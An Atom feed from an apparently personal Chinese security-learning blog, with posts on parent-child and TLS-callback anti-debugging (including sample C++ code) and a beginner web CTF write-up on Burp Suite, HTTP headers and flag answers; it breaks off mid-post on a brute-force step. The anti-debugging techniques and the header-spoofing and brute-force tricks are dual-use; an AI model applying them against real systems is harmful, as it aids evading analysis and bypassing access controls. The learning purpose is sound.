<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>pRism</title>
  
  
  <link href="https://www.pri87.vip/atom.xml" rel="self"/>
  
  <link href="https://www.pri87.vip/"/>
  <updated>2024-08-06T14:14:59.936Z</updated>
  <id>https://www.pri87.vip/</id>
  
  <author>
    <name>pRism</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>父子进程反调试</title>
    <link href="https://www.pri87.vip/posts/3f67770.html"/>
    <id>https://www.pri87.vip/posts/3f67770.html</id>
    <published>2024-08-06T12:20:43.000Z</published>
    <updated>2024-08-06T14:14:59.936Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>顾名思义，如果一个进程创建出了另一个进程</p><p>然后用第一个进程（父）去调试第二个进程（子）</p><p>子进程由于已经被调试，所以不能再被调试器附加，从而防止了真实逻辑被调试</p><p>这里引申出几个议题：</p><blockquote><p>如何创建另一个进程（子进程的来源）</p><ul><li>另一个可执行程序</li><li>就是本身</li><li>一段内存中的代码</li></ul><p>从上又分出几个问题</p><ul><li>创建另一个可执行程序（已经存在的，还是在代码里面需要dump或者从网上下载）</li><li>本身（如何区分两次执行的逻辑流）</li><li>一段内存中的代码（CreateProcess很明显不支持，那要怎么办）</li></ul></blockquote><p>第二：</p><blockquote><p>如何用父进程调试子进程</p><p>在win API中有CreateProcess的第6个参数可以选择父进程作为调试器。</p><p>然后通过API中其它函数来接受调试信息以及读取&#x2F;修改子进程的上下文&#x2F;寄存器&#x2F;执行流。</p><p>有没有其它办法不知道</p></blockquote><p>第三：</p><blockquote><p>执行完如何返回内容&#x2F;结果</p><p>同样在win API中有函数OutputDebugString来输出调试信息</p></blockquote><p>现在以创建自身为新进程来解释</p><hr><h2 id="区分逻辑流的方法"><a href="#区分逻辑流的方法" class="headerlink" title="区分逻辑流的方法"></a>区分逻辑流的方法</h2><p>区分逻辑流，表明为需要一个if-else分支语句来执行不同的代码</p><p>因此</p><ul><li>if中写一样的内容，但是可能返回不同的东西</li><li>在执行第一个逻辑时修改了本身，导致执行流的改变</li></ul><p>对于第一种情况</p><ul><li>检查自身的状态，两次的状态不一致</li><li>检查外界的状态，通过本身在外界的注册内容来判断</li></ul><p>常见标志位<br>系统函数</p><p>这些内容还没怎么学QAQ</p><p>我只知道绑定端口和创建互斥体两个函数，这两个函数只要指定了id，只要第一次返回可行，第二次一定失败。借这个来直接区分逻辑流，至于使用它们，自然不重要</p><p>还有就是创建进程时可以指定参数，参数数量也可以算作不同的内容</p><hr><h2 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h2><p>首先CreateProcess，并设置DEBUG_PROCESS</p><p>然后WaitForDebugEvent等待并读取调试信息</p><p>然后用得到的debugEvent.dwDebugEventCode来判断类型</p><p>比如：EXCEPTION_DEBUG_EVENT（int 3断点）</p><p>然后就可以用WriteProcessMemory写入内存，其它的像获取rip，stack之类的就不说了</p><p>最后ContinueDebugEvent继续执行流程</p><p>这里只是大概说个流程</p>]]></content>
    
    
    <summary type="html">我创建我自己</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    
    <category term="逆向" scheme="https://www.pri87.vip/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="反调试" scheme="https://www.pri87.vip/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>TLS相关研究</title>
    <link href="https://www.pri87.vip/posts/95e9e72b.html"/>
    <id>https://www.pri87.vip/posts/95e9e72b.html</id>
    <published>2024-08-06T10:44:01.000Z</published>
    <updated>2024-08-06T13:13:00.792Z</updated>
    
    <content type="html"><![CDATA[<p>经常能看到有tls的题，这里研究一下tls的原理和写法</p><p>然后就发现网上已经有很全的教程了，那我就直接放教程了</p><p><a href="https://www.52pojie.cn/thread-1490663-1-1.html">【原创】反调试实战系列二 TLS反调试+CheckRemoteDebuggerPresent原理 - 『软件调试区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><h3 id="写法"><a href="#写法" class="headerlink" title="写法"></a>写法</h3><p>这个说的很清楚，要写TLS函数，只需要：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//包含回调</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64       <span class="comment">//64位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_used&quot;</span>)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span>               <span class="comment">//32位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>) </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//创建段</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">EXTERN_C <span class="type">const</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="comment">//是c语言就不写</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//前缀表示这是线程的全局变量，每个线程初始化的值都是0x1，生命仅在这个线程内</span></span><br><span class="line">__declspec (thread) <span class="type">int</span> CheckIsChildren = <span class="number">0x1</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//函数定义</span></span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">t_TlsCallBack</span><span class="params">(PVOID Dllhandle, DWORD Reason, PVOID Reserved)</span></span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加函数到数组，执行时按数组元素依次执行</span></span><br><span class="line">PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; t_TlsCallBack ,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>然后就是：</p><h3 id="reason"><a href="#reason" class="headerlink" title="reason"></a>reason</h3><p>Reason值对应4种调用原因，在这四个条件下，都会触发TLS回调函数</p><table><thead><tr><th align="left">宏定义</th><th align="left">值</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">DLL_PROCESS_ATTACH</td><td align="left">1</td><td align="left">一个新进程已经启动，包括第一个线程</td></tr><tr><td align="left">DLL_THREAD_ATTACH</td><td align="left">2</td><td align="left">创建了一个新线程。此通知已发送给除第一个线程外的所有线程</td></tr><tr><td align="left">DLL_THREAD_DETACH</td><td align="left">3</td><td align="left">线程即将被终止。此通知已发送给除第一个线程外的所有线程</td></tr><tr><td align="left">DLL_PROCESS_DETACH</td><td align="left">0</td><td align="left">进程即将终止，包括原始线程</td></tr></tbody></table><p>所以内部应当使用if来判断（或者没有创建线程，就不管了）</p><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><ul><li>在使用CreateThread后记得WaitForSingleObject防止主线程提前结束</li><li>tls声明的变量是在每个线程里面分离的，互不影响，类似于静态局部变量？？</li></ul><hr><p>相关代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//包含回调</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64       <span class="comment">//64位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_used&quot;</span>)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span>               <span class="comment">//32位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>) </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//创建段</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">EXTERN_C <span class="type">const</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__declspec (thread) <span class="type">int</span> CheckIsChildren = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* szMsg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hStdout = <span class="built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);</span><br><span class="line"><span class="built_in">WriteConsoleA</span>(hStdout, szMsg, <span class="built_in">strlen</span>(szMsg), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">t_TlsCallBack</span><span class="params">(PVOID Dllhandle, DWORD Reason, PVOID Reserved)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">CheckIsChildren--;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;loaded\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">2</span>) &#123;</span><br><span class="line">CheckIsChildren += <span class="number">7</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;this is %d\n&quot;</span>, CheckIsChildren);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">3</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;exit thread %d\n&quot;</span>, CheckIsChildren);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="type">char</span> szMsg[<span class="number">80</span>] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line"><span class="built_in">wsprintfA</span>(szMsg, <span class="string">&quot;%d&quot;</span>, CheckIsChildren);</span><br><span class="line"><span class="built_in">print</span>(szMsg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; t_TlsCallBack ,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">MyThreadFunction</span><span class="params">(LPVOID lpParam)</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Thread running with value: &quot;</span> &lt;&lt; CheckIsChildren &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;why dont play\n&quot;</span>;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (CheckIsChildren == <span class="number">0</span>) &#123;</span><br><span class="line">CheckIsChildren += <span class="number">2</span>;</span><br><span class="line">std::cout &lt;&lt; CheckIsChildren &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">PROCESS_INFORMATION ProInfo;</span><br><span class="line">STARTUPINFO StartInfo;</span><br><span class="line"><span class="built_in">ZeroMemory</span>(&amp;StartInfo, <span class="built_in">sizeof</span>(StartInfo));</span><br><span class="line">TCHAR ModulePath[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, ModulePath, <span class="number">100</span>);</span><br><span class="line"><span class="type">int</span> input = <span class="number">1</span>;</span><br><span class="line"><span class="comment">/*CreateProcess(NULL,</span></span><br><span class="line"><span class="comment">ModulePath,</span></span><br><span class="line"><span class="comment">NULL,</span></span><br><span class="line"><span class="comment">NULL,</span></span><br><span class="line"><span class="comment">TRUE,</span></span><br><span class="line"><span class="comment">DEBUG_PROCESS,</span></span><br><span class="line"><span class="comment">NULL,</span></span><br><span class="line"><span class="comment">NULL,</span></span><br><span class="line"><span class="comment">&amp;StartInfo,</span></span><br><span class="line"><span class="comment">&amp;ProInfo);</span></span><br><span class="line"><span class="comment">WaitForSingleObject(ProInfo.hProcess, INFINITE);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CloseHandle(ProInfo.hProcess);</span></span><br><span class="line"><span class="comment">CloseHandle(ProInfo.hThread);</span></span><br><span class="line"><span class="comment">printf(&quot;\nfinished\n&quot;);*/</span></span><br><span class="line">DWORD threadId;</span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line"><span class="literal">NULL</span>,                   <span class="comment">// 默认安全属性</span></span><br><span class="line"><span class="number">0</span>,                      <span class="comment">// 默认堆栈大小</span></span><br><span class="line">MyThreadFunction,       <span class="comment">// 线程函数</span></span><br><span class="line">&amp;input,                 <span class="comment">// 传递给线程函数的参数</span></span><br><span class="line"><span class="number">0</span>,                      <span class="comment">// 默认创建标志</span></span><br><span class="line">&amp;threadId               <span class="comment">// 返回线程ID</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//Sleep(1000);</span></span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;NO!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;yes,yes,yes&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">TLS</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    
    <category term="反调试" scheme="https://www.pri87.vip/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>web入门</title>
    <link href="https://www.pri87.vip/posts/f3edc96d.html"/>
    <id>https://www.pri87.vip/posts/f3edc96d.html</id>
    <published>2024-08-05T15:02:48.000Z</published>
    <updated>2024-08-05T15:10:02.993Z</updated>
    
    <content type="html"><![CDATA[<h3 id="开发者工具打开方式"><a href="#开发者工具打开方式" class="headerlink" title="开发者工具打开方式"></a>开发者工具打开方式</h3><ul><li>F12&#x2F;command option I<br>ctrl shift I</li><li>右上角更多，开发人员工具</li><li>右键页面，检查</li></ul><h3 id="Burpsuit使用场景"><a href="#Burpsuit使用场景" class="headerlink" title="Burpsuit使用场景"></a>Burpsuit使用场景</h3><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><p>在服务器和客户端之间放一个中间人，两边只和中间人相联系，通过中间人，我们可以看到两边交互的数据以及修改它们</p><h4 id="重放"><a href="#重放" class="headerlink" title="重放"></a>重放</h4><p>发送到重放，我们可以修改内容然后再发送</p><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>发送到爆破，遍历一些内容并发送，实现爆破攻击得到想要的东西</p><h4 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h4><p>得到的响应包可能是编码后的内容，使用解码来查看生字符，或者把信息编码后发送</p><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>客户端&#x2F;服务端：前者是请求内容的，后者是计算并提供内容的</p><p>请求包&#x2F;相应包：客户端发给服务端的包，服务端响应客户端返回的包</p><h4 id="请求包-相应包格式"><a href="#请求包-相应包格式" class="headerlink" title="请求包&#x2F;相应包格式"></a>请求包&#x2F;相应包格式</h4><h5 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /?wllm=<span class="number">2</span>%<span class="number">27</span>% HTTP/<span class="number">1</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>字段</th><th>作用</th></tr></thead><tbody><tr><td>请求方法</td><td>说明是get还是post</td></tr><tr><td>URL字段</td><td>如果是get就会有get内容的具体说明</td></tr><tr><td>HTTP版本协议</td><td>1.1或1.0</td></tr></tbody></table><h5 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h5><p><a href="https://blog.csdn.net/qq_42684504/article/details/106634035">HTTP 请求头各参数具体含义_请求头的参数详解-CSDN博客</a></p><h5 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>用于分隔请求头和数据</p><h5 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h5><p>如果是GET，则为空行，如果是POST，则是xxx&#x3D;xxx&amp;xxx&#x3D;xxx形式的变量及值</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">params<span class="operator">=</span>BbITMWZukVrbpcvF<span class="number">9E9</span>subK<span class="number">2</span><span class="keyword">c</span><span class="number">4</span>G<span class="number">5</span>qLX<span class="number">0</span>zQfWyh<span class="number">3</span>TukD<span class="number">43</span>kI<span class="variable">%2</span>BdaOFlA<span class="number">9</span>rOJTasxuH<span class="number">9</span>cRGzv<span class="number">8</span>A<span class="variable">%2</span>BTuJIi<span class="variable">%2</span>Fq<span class="number">6</span>QDciuadCEJ<span class="number">1</span>ppF<span class="number">6</span>eP<span class="number">8</span>k<span class="number">2</span>wR<span class="variable">%2</span>FkQiZnohRO&amp;encSecKey<span class="operator">=</span>decd<span class="number">4703</span>eddd<span class="number">42253</span>cb<span class="number">59259</span><span class="keyword">c</span><span class="number">60</span>f<span class="number">689869</span>cb<span class="number">6</span>df<span class="number">59</span>b<span class="number">7</span>ab<span class="number">906917</span>f<span class="number">23</span>b<span class="number">76</span>eb<span class="number">2</span>d<span class="number">5393</span>b<span class="number">40e1</span>bbd<span class="number">0</span>b<span class="number">697700288149</span>d<span class="number">4</span>ca<span class="number">398</span>a<span class="number">8</span><span class="keyword">c</span><span class="number">20</span>f<span class="number">000</span><span class="keyword">cc</span><span class="number">3</span>f<span class="number">47452984</span>d<span class="number">6665</span><span class="keyword">c</span><span class="number">5183</span><span class="keyword">c</span><span class="number">1330729</span>fed<span class="number">3</span>d<span class="number">63e4011495</span>f<span class="number">3</span>cee<span class="number">6</span>ff<span class="number">4e29</span>d</span><br></pre></td></tr></table></figure><h4 id="响应码"><a href="#响应码" class="headerlink" title="响应码"></a>响应码</h4><p><a href="https://www.runoob.com/http/http-status-codes.html">HTTP 状态码 | 菜鸟教程 (runoob.com)</a></p><h4 id="robot-txt"><a href="#robot-txt" class="headerlink" title="robot.txt"></a>robot.txt</h4><p>如果网站根目录有这个文件，合法的爬虫爬取时就会依照这个文件的要求去(不)爬取相应的文件</p><p>格式：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Allow</span><span class="punctuation">: </span>/</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/</span><br></pre></td></tr></table></figure><p>User-agent用于表明自己的身份或区分用途</p><p>比如：Googlebot，Googlebot-Image，Storebot-Google，Bingbot等</p><p>Disallow用于写入不允许访问的目录或文件，似乎支持正则表达式</p><p>Allow用于只能访问对应的目录或文件，似乎支持正则表达式。比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Disallow: /blog Allow: /blog/allowed-post</span><br></pre></td></tr></table></figure><p>只允许访问allowed-post，而同目录下其它的不能访问</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><h3 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12"></a>gift_F12</h3><p>根据提示，f12打开开发者模式，找到源码，发现flag：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">WLLMCTF</span><span class="template-variable">&#123;We1c0me_t0_WLLMCTF_Th1s_1s_th3_G1ft&#125;</span></span><br></pre></td></tr></table></figure><h3 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h3><p>发送get和post请求即可</p><h3 id="Do-you-know-HTTP"><a href="#Do-you-know-HTTP" class="headerlink" title="Do you know HTTP"></a>Do you know HTTP</h3><p>根据要求修改请求头</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HS</span> / HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: node5.anna.nssctf.cn:<span class="number">22621</span></span><br><span class="line"><span class="attribute">Gecko</span>/<span class="number">20100101</span> Firefox/<span class="number">115</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/jxl,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">X</span>-Forwarded-For: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">Referer</span>: www.ltyyds.com</span><br><span class="line"><span class="attribute">User</span>-Agent: LT</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一开始被坑了，在最后放了一个User-Agent: LT不知道为什么出不来，结果发现在上面还有一个User-Agent，删了就出了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">NSSCTF</span>&#123;e6688e51-abc6-<span class="number">4943</span>-b819-<span class="number">3</span>e4d967c9457&#125;</span><br></pre></td></tr></table></figure><h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>不知道为什么场景启动不了</p><p>没写</p><h3 id="ctfhub-web前置-http"><a href="#ctfhub-web前置-http" class="headerlink" title="ctfhub-web前置-http"></a>ctfhub-web前置-http</h3><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><p>直接修改请求方式为CTFHUB</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctfhub</span>&#123;<span class="number">0</span>a211e2f0ed998f0bb25c674&#125; </span><br></pre></td></tr></table></figure><h4 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h4><p>好怪，跟着wp做出来了</p><p>但是还是不理解为什么重放（重放有自动拦截功能，可以点击跟随重定向得到重定向后的内容）一遍就好了，发送的包都是一样的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctfhub</span>&#123;<span class="number">1</span>b0aee8a83c3e0d0322ce749&#125;</span><br></pre></td></tr></table></figure><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>在请求头中把admin改成1</p><h4 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h4><p>先抓包，发现一串base64，解码后发现是用户名:密码</p><p>好像给了一些能爆破的密码，但是不知道用户名，先猜一个admin</p><p>然后在intruder里面</p><p><img 